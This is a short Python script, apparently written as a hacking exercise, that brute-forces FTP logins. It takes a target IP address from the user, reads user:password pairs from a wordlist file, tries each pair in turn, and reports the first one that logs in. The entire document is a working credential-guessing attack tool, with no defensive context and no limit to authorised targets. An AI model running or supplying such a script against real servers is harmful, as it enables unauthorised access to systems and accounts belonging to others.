#!/usr/bin/python

import ftplib
from termcolor import colored

def brutelogin(host, passwdfile):
    try:
        pf = open(passwdfile, 'r') #open specified file in read mode
    except:
        print('[!!] File Does Not Exist')
        return
    
    for line in pf.readlines(): #parsing pf line
        userName = line.split(':')[0] #spliting the line into UserName and Password
        passWord = line.split(':')[1].strip('\n')
        print('[*] Trying: '+userName+'/'+passWord)
        
        try:
            ftp = ftplib.FTP(host) #get host
            login = ftp.login(userName, passWord) #try login 
            print(colored('[+] Login Suceeded with '+userName+'/'+passWord, 'green'))
            ftp.quit
            return
        except:
            pass
    print(colored('[-] Password not in list', 'red'))
host = input('[*] Enter IP address: ') #host IP address
passwdfile = input('[*] Enter User/Password Path: ') #Full path for file containing User and Password
brutelogin(host, passwdfile)
